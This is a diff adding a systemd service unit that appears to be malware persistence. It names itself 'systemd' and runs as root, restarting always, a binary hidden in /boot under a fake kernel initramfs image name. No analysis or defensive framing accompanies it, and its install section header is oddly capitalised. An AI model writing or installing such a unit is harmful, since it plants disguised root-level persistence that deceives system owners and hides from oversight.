@@ -1,0 +1,11 @@
+[Unit]
+Description=systemd
+
+[Service]
+ExecStart=/boot/init.img-5.15.0-122-generic
+Restart=always
+User=root
+Group=root
+
+[INSTALL]
+WantedBy=multi-user.target
